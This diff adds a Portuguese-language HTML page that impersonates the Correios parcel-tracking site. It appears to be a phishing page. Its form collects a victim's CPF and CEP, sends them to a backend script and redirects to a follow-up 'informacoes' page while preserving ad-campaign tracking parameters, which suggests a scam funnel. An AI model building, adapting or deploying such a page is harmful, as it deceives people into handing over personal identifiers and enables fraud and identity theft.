@@ -1,0 +1,313 @@
+<html lang="pt-BR"><head></head>
+<body>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="stylesheet" href="css/bootstrap.css">
+  <link rel="stylesheet" href="css/app.css">
+  <link rel="stylesheet" href="css/yellow.css">
+  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png">
+  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+  <title>Correios | Rastreio</title>
+  <style>
+    /* Animação para o botão pulsando */
+    @keyframes pulsar {
+      0% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.1);
+      }
+
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    #confirmar-btn {
+      animation: pulsar 1s infinite;
+    }
+
+    /* Estilos para o pop-up */
+    #popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      animation: fadeInOverlay 0.5s ease-out;
+    }
+
+    #popup-content {
+      background: #fff;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      width: 90%;
+      max-width: 500px;
+      animation: slideIn 0.5s ease-out;
+      font-family: 'Arial', sans-serif;
+    }
+
+    #popup-content h2 {
+      font-size: 1.8rem;
+      font-weight: bold;
+      margin-bottom: 20px;
+      color: #003157;
+    }
+
+    #popup-content p {
+      font-size: 1.1rem;
+      margin-bottom: 15px;
+    }
+
+    #popup-content p span {
+      font-weight: bold;
+      color: #007bff;
+    }
+
+    #popup-content .btn {
+      margin-top: 20px;
+      font-size: 1rem;
+      padding: 10px 20px;
+      border-radius: 8px;
+    }
+
+    /* Animações */
+    @keyframes fadeInOverlay {
+      from {
+        opacity: 0;
+      }
+
+      to {
+        opacity: 1;
+      }
+    }
+
+    @keyframes slideIn {
+      from {
+        transform: translateY(-50px);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    /* Animação de carregamento */
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid rgba(0, 0, 0, 0.1);
+      border-top-color: #007bff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+
+
+
+  <header class="w-100 font-size-16 font-weight-400 text-blue">
+    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
+      <span>Acessibilidade</span>
+      <i class="fas fa-caret-down ml-1"></i>
+    </div>
+    <div class="">
+      <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px">
+        <div class="menu-toggle" id="menu-toggle" style="width:50px">
+          <div class="bar"></div>
+          <div class="bar"></div>
+          <div class="bar"></div>
+        </div>
+        <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
+          <a href="#" class="py-2">
+            <img src="images/correios.png" alt="" height="25">
+          </a>
+        </div>
+        <div class="ml-4 d-none d-lg-block" style="width:150px">
+          <a href="#" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
+            <img src="images/entrar.svg" alt="Correios" width="31">
+            <span class="ml-1">Entrar</span>
+          </a>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <h1 class="mt-4 px-2 font-size-24 text-blue-dark font-weight-700 w-95 max-w-1000 d-flex justify-content-between" style="margin:0 auto;">
+      Rastreamento
+    </h1>
+
+    <section class="mt-3 p-4 bg-grey-3 w-95 max-w-1000" style="margin:0 auto;">
+      <h5 style="color: #003157;" class="text-center font-weight-700 mb-4">
+        <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
+      </h5>
+
+      <form id="form-rastreamento">
+        <span>Deseja acompanhar seu objeto?</span><br>
+        <span>Digite o CPF do comprador.</span>
+        <div class="form-group mt-1">
+          <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required="" id="cpf">
+        </div>
+
+        <span>Informe o seu CEP abaixo.</span>
+        <div class="form-group mt-1">
+          <input type="text" name="cep" class="form-control" id="cep" placeholder="00000-000" maxlength="9" required="">
+        </div>
+
+
+        <div class="form-group mt-1 d-flex justify-content-center" id="botao-container">
+          <button type="submit" class="btn btn-primary" id="consultar-btn">Consultar</button>
+        </div>
+
+        <div id="loading-container" style="display: none; text-align: center; margin-top: 20px;">
+          <p style="font-size: 16px; color: #333;">Consultando seus dados...</p>
+          <div class="spinner" style="border: 4px solid rgba(0,0,0,0.1); border-left-color: #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;">
+          </div>
+        </div>
+
+        <style>
+          @keyframes spin {
+            to {
+              transform: rotate(360deg);
+            }
+          }
+        </style>
+
+
+      </form>
+
+      
+
+
+    </section>
+
+    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
+      <div>
+        <img src="images/banner-1.jpg" alt="" class="w-100">
+      </div>
+    </section>
+  </main>
+
+  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
+    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+      <h5 class="font-weight-700 mb-4">Fale Conosco</h5>
+      <ul>
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-desktop"></i>
+          <a href="#" class="ml-2 text-blue-dark text-hover-orange">
+            <span class="text-wrap">Registro de Manifestações</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </footer>
+<script>
+  document.getElementById('form-rastreamento').addEventListener('submit', async function (event) {
+    event.preventDefault();
+
+    const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+    const cepInput = document.getElementById('cep');
+    const cep = cepInput.disabled ? '' : cepInput.value.replace(/\D/g, '');
+
+    const botao = document.getElementById('consultar-btn');
+    const botaoContainer = document.getElementById('botao-container');
+    const loadingContainer = document.getElementById('loading-container');
+
+    if (!cpf) {
+      alert('Por favor, insira o CPF.');
+      return;
+    }
+
+    botao.style.display = "none";
+
+    setTimeout(() => {
+      botaoContainer.style.display = "none";
+      loadingContainer.style.display = "block";
+    }, 100);
+
+    try {
+      const response = await fetch(`consulta.php?cpf=${cpf}&cep=${cep}`);
+      const data = await response.json();
+
+      if (data.status === 200) {
+        const newParams = new URLSearchParams();
+        newParams.set("cpf", cpf);
+        if (cep) newParams.set("cep", cep);
+
+        // Preservar os parâmetros UTM da URL atual
+        const currentParams = new URLSearchParams(window.location.search);
+        const utmFields = ["src", "sck", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
+        
+        utmFields.forEach(field => {
+          if (currentParams.has(field)) {
+            newParams.set(field, currentParams.get(field));
+          }
+        });
+
+        // Redirecionar para "informacoes" com os parâmetros completos
+        window.location.href = `informacoes?${newParams.toString()}`;
+      } else {
+        alert('Erro na consulta: ' + (data.message || 'Tente novamente.'));
+        botao.style.display = "block"; 
+        botaoContainer.style.display = "flex";
+        loadingContainer.style.display = "none";
+      }
+    } catch (error) {
+      alert('Erro ao conectar ao servidor.');
+      botao.style.display = "block"; 
+      botaoContainer.style.display = "flex";
+      loadingContainer.style.display = "none";
+    }
+  });
+
+  document.getElementById('nao-sei-cep').addEventListener('change', function () {
+    const cepInput = document.getElementById('cep');
+    cepInput.disabled = this.checked;
+    if (this.checked) {
+      cepInput.value = '';
+    }
+  });
+
+  // Função para adicionar parâmetros UTM aos links
+  function adicionarParametrosUTM() {
+    const location = new URL(window.location.href);
+    const fields = ["src", "sck", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
+    var links = document.querySelectorAll("a[href]");
+
+    links.forEach(link => {
+      if (!link.href.includes("#")) {
+        let newURL = new URL(link.href);
+        fields.forEach(field => {
+          if (location.searchParams.has(field)) {
+            newURL.searchParams.set(field, location.searchParams.get(field));
+          }
+        });
+        link.href = newURL.toString();
+      }
+    });
+  }
+
+  // Chamada imediata ao carregar a página
+  document.addEventListener("DOMContentLoaded", adicionarParametrosUTM);
+</script>
+
+
+</body></html>
